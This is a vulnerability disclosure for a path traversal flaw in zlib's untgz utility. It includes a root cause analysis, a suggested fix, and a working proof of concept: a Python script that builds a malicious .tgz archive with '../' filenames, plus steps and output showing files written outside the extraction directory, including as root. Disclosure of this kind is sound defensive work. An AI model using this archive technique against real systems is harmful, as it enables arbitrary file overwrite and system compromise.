# Title: Path Traversal Vulnerability in zlib untgz ≤ 1.3.1

**BUG_Author:** mifya

**Affected Version:** zlib ≤ 1.3.1.2

**Vendor:** [zlib Official Website](https://zlib.net/)

**Software:** [zlib - contrib/untgz](https://github.com/madler/zlib)

**Vulnerability Files:**

- `contrib/untgz/untgz.c`

---

## Description:

A path traversal vulnerability exists in the `untgz` utility bundled with zlib versions up to and including 1.3.1. The vulnerability allows an attacker to write arbitrary files outside the intended extraction directory by crafting a malicious `.tgz` archive containing filenames with directory traversal sequences (e.g., `../`).

### Root Cause Analysis:

1. **Unsafe File Path Handling:**
   - In the file `contrib/untgz/untgz.c`, the `tar()` function (lines 385-575) directly uses filenames from the tar archive header without proper sanitization.
   - Specifically, at line 439, the filename is copied from the tar header:
     ```c
     strncpy(fname, buffer.header.name, SHORTNAMESIZE);
     ```
   - At line 481, this unsanitized filename is used to create files:
     ```c
     outfile = fopen(fname, "wb");
     ```

2. **Missing Path Validation:**
   - The code does not check for or filter out `../` sequences in filenames.
   - The code does not verify that extracted files remain within the intended extraction directory.
   - Absolute paths (starting with `/`) are also not blocked.

3. **Impact:**
   - An attacker can craft a malicious `.tgz` archive that, when extracted, writes files to arbitrary locations on the filesystem.
   - If `untgz` is run with elevated privileges (e.g., root), this can lead to:
     - Arbitrary file overwrite (e.g., `/etc/passwd`, `/etc/shadow`)
     - Remote code execution via overwriting startup scripts or cron jobs
     - Complete system compromise

---

## Proof of Concept:

### Step 1: Create Malicious Archive

Create a Python script to generate a malicious `.tgz` file:

```python
#!/usr/bin/env python3
import tarfile
import gzip
import io

def create_malicious_tgz(output_path):
    tar_buffer = io.BytesIO()
    
    with tarfile.open(fileobj=tar_buffer, mode='w') as tar:
        # Malicious path traversal payload
        malicious_filename = "../../../tmp/pwned_by_path_traversal.txt"
        
        content = b"PATH TRAVERSAL VULNERABILITY EXPLOITED!\n"
        content += b"This file was written outside the extraction directory.\n"
        
        info = tarfile.TarInfo(name=malicious_filename)
        info.size = len(content)
        info.mode = 0o644
        tar.addfile(info, io.BytesIO(content))
    
    with gzip.open(output_path, 'wb') as f:
        f.write(tar_buffer.getvalue())
    
    print(f"[+] Created malicious archive: {output_path}")

if __name__ == "__main__":
    create_malicious_tgz("malicious.tgz")
```

### Step 2: Compile Vulnerable untgz

```bash
cd zlib-1.3.1
./configure && make
cd contrib/untgz
gcc -O3 -I../.. -L../.. -o untgz untgz.c -lz
```

### Step 3: Execute the Exploit

```bash
# Create test directory
mkdir -p /tmp/test_extract
cd /tmp/test_extract

# Run untgz to extract malicious archive
LD_LIBRARY_PATH=/path/to/zlib-1.3.1 /path/to/untgz /path/to/malicious.tgz
```

### Step 4: Verify Exploitation

```bash
# Check if file was written outside extraction directory
cat /tmp/pwned_by_path_traversal.txt
```

**Expected Output:**

```
PATH TRAVERSAL VULNERABILITY EXPLOITED!
This file was written outside the extraction directory.
```

---

## Exploitation Evidence:

```bash
$ cd /tmp/test_extract
$ untgz malicious.tgz
Extracting ../../../tmp/pwned_by_path_traversal.txt

$ cat /tmp/pwned_by_path_traversal.txt
PATH TRAVERSAL VULNERABILITY EXPLOITED!
This file was written outside the extraction directory.
```

When running as root:

```
root@host:/tmp/test_extract# untgz malicious_root.tgz
Extracting ../../../../../../../../testtest

root@host:/tmp/test_extract# cat /testtest
PWNED BY PATH TRAVERSAL!
This proves arbitrary file overwrite vulnerability.
If you see this, the root-owned file was overwritten!
```

![](https://cdn.jsdelivr.net/gh/miffyaa/images@main//images20260122114834938.png)
---

## Vulnerable Code Snippet:

**File:** `contrib/untgz/untgz.c`

```c
// Line 439: Filename copied directly from tar header without sanitization
strncpy(fname, buffer.header.name, SHORTNAMESIZE);
if (fname[SHORTNAMESIZE-1] != 0)
    fname[SHORTNAMESIZE] = 0;

// ... later ...

// Line 481: Unsanitized filename used to create file
outfile = fopen(fname, "wb");
```

---

## Suggested Fix:

Add path validation before file creation:

```c
int is_path_safe(const char *path) {
    // Reject path traversal sequences
    if (strstr(path, "..") != NULL) return 0;
    // Reject absolute paths
    if (path[0] == '/') return 0;
    // Reject backslash traversal (Windows)
    if (strstr(path, "..\\") != NULL) return 0;
    return 1;
}

// Before fopen():
if (!is_path_safe(fname)) {
    fprintf(stderr, "Skipping unsafe path: %s\n", fname);
    continue;
}
outfile = fopen(fname, "wb");
```
